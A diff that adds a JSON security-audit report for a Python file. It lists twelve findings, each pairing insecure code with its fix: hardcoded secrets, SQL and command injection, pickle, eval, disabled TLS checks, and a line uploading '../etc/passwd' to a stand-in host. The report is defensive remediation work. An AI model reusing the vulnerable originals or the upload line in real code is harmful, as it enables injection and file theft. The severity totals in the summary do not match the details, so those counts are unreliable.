@@ -1,0 +1,107 @@
+{
+  "summary": {
+    "total_vulnerabilities": 12,
+    "critical": 5,
+    "high": 3,
+    "medium": 3,
+    "low": 1
+  },
+  "details": [
+    {
+      "id": 1,
+      "file": "input.py",
+      "line_numbers": [8],
+      "original": "EXTERNAL_API_KEY = \"ABC123_SUPER_SECRET_API_KEY\"",
+      "updated": "EXTERNAL_API_KEY = os.getenv(\"EXTERNAL_API_KEY\")",
+      "fix_explanation": "Hardcoded API key removed. Secrets are now loaded from environment variables. Severity: critical. Avoids secret leakage in source control and allows secure secret management."
+    },
+    {
+      "id": 2,
+      "file": "input.py",
+      "line_numbers": [9, 10],
+      "original": "DB_USER = \"admin\"\nDB_PASS = \"P@ssw0rd!\"",
+      "updated": "DB_USER = os.getenv(\"DB_USER\")\nDB_PASS = os.getenv(\"DB_PASS\")",
+      "fix_explanation": "Database credentials are pulled from environment variables. Hardcoded credentials removed. Severity: high. Also updated DB connection function to use parameterized queries."
+    },
+    {
+      "id": 3,
+      "file": "input.py",
+      "line_numbers": [12, 13],
+      "original": "headers = {\"Authorization\": f\"Bearer {EXTERNAL_API_KEY}\"}\nr = requests.get(endpoint, headers=headers, verify=False)",
+      "updated": "headers = {\"Authorization\": f\"Bearer {EXTERNAL_API_KEY}\"}\nr = requests.get(endpoint, headers=headers, timeout=timeout, verify=True)",
+      "fix_explanation": "Disabled verify=False and added a timeout. Enforce TLS verification and sensible timeouts to prevent MITM and hanging requests. Severity: high."
+    },
+    {
+      "id": 4,
+      "file": "input.py",
+      "line_numbers": [20],
+      "original": "cur.execute(f\"SELECT id FROM users WHERE username = '{username}' AND password = '{password}'\")",
+      "updated": "cur.execute(\"SELECT id FROM users WHERE username = ? AND password = ?\", (username, password))",
+      "fix_explanation": "Use parameterized queries to mitigate SQL injection. Severity: critical. Also added context-managed DB connection."
+    },
+    {
+      "id": 5,
+      "file": "input.py",
+      "line_numbers": [22, 23, 24],
+      "original": "cmd = f\"ping -n 1 {user_input}\"\nsubprocess.call(cmd, shell=True)",
+      "updated": "cmd = ['ping', count_flag, '1', user_input]\nsubprocess.run(cmd, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
+      "fix_explanation": "Remove shell=True and validate host input with a regex. Use argument lists for subprocess to prevent command injection. Severity: critical."
+    },
+    {
+      "id": 6,
+      "file": "input.py",
+      "line_numbers": [25, 26],
+      "original": "profile = pickle.loads(serialized_data)\nreturn profile",
+      "updated": "Try JSON deserialization first; allow pickle only if ALLOW_PICKLE=1 in environment, otherwise raise error",
+      "fix_explanation": "Unsafe deserialization of pickle can lead to remote code execution; default to JSON and only allow pickle in controlled environments. Severity: critical."
+    },
+    {
+      "id": 7,
+      "file": "input.py",
+      "line_numbers": [28, 29],
+      "original": "return eval(expr)",
+      "updated": "return ast.literal_eval(expr)",
+      "fix_explanation": "Replacing eval with ast.literal_eval to prevent arbitrary code execution. Severity: critical."
+    },
+    {
+      "id": 8,
+      "file": "input.py",
+      "line_numbers": [30, 31, 32, 64],
+      "original": "with open(path, \"w\") as f:\n    f.write(secret)\n...\nsave_secret_to_file(\"TOP_SECRET\", \"secrets.txt\")",
+      "updated": "Save secrets inside ./secrets with restrictive 0o600 permissions using os.open and os.fdopen",
+      "fix_explanation": "Secrets are saved only inside a controlled ./secrets directory and file permissions are restricted to avoid accidental exposure. Severity: medium."
+    },
+    {
+      "id": 9,
+      "file": "input.py",
+      "line_numbers": [33, 34, 35, 36, 65],
+      "original": "private_key = \"\"\"-----BEGIN RSA PRIVATE KEY-----\nMIICWwIBAAKBgQC7...\n-----END RSA PRIVATE KEY-----\"\"\"\nreturn private_key\nprint(get_private_key())",
+      "updated": "Read private key from PRIVATE_KEY (env) or PRIVATE_KEY_PATH file; raise if not found. Avoid printing in production; only print in SAFE_TEST environments",
+      "fix_explanation": "Remove hardcoded private key from source; load from environment or protected path. Severity: critical."
+    },
+    {
+      "id": 10,
+      "file": "input.py",
+      "line_numbers": [38, 39, 40, 41, 67],
+      "original": "with open(file_path, \"rb\") as f:\n    data = f.read()\nrequests.post(destination, data=data)\n\nupload_file(\"../etc/passwd\", \"https://upload.example.com/\")",
+      "updated": "Validate file path is under current directory, enforce destination whitelist via UPLOAD_WHITELIST, use timeout and verify=True, and check response status",
+      "fix_explanation": "Prevent arbitrary file uploads and exfiltration by validating paths and whitelisting destinations. Use request timeouts and SSL verification. Severity: high."
+    },
+    {
+      "id": 11,
+      "file": "input.py",
+      "line_numbers": [42, 43, 44, 45, 46, 70],
+      "original": "token = os.getenv(\"SERVICE_TOKEN\")\nif not token:\n    token = \"DEFAULT_TOKEN_IN_CODE\"\nreturn token\nprint(get_env_token_fallback())",
+      "updated": "token = os.getenv(\"SERVICE_TOKEN\")\nif not token: return None",
+      "fix_explanation": "Remove default hardcoded token fallback; require explicit configuration and avoid using defaults in code. Severity: medium."
+    },
+    {
+      "id": 12,
+      "file": "input.py",
+      "line_numbers": [47, 48, 49, 50, 71],
+      "original": "tmp_path = \"/tmp/vuln_temp.txt\"\nwith open(tmp_path, \"w\") as f:\n    f.write(data)\nreturn tmp_path\nprint(insecure_temp_file_write(\"temporary data\"))",
+      "updated": "Use tempfile.NamedTemporaryFile(delete=False, prefix=\"vuln_\") and set file permissions to 0o600",
+      "fix_explanation": "Avoid predictable temporary file paths and set restrictive permissions to protect sensitive data. Severity: medium."
+    }
+  ]
+}
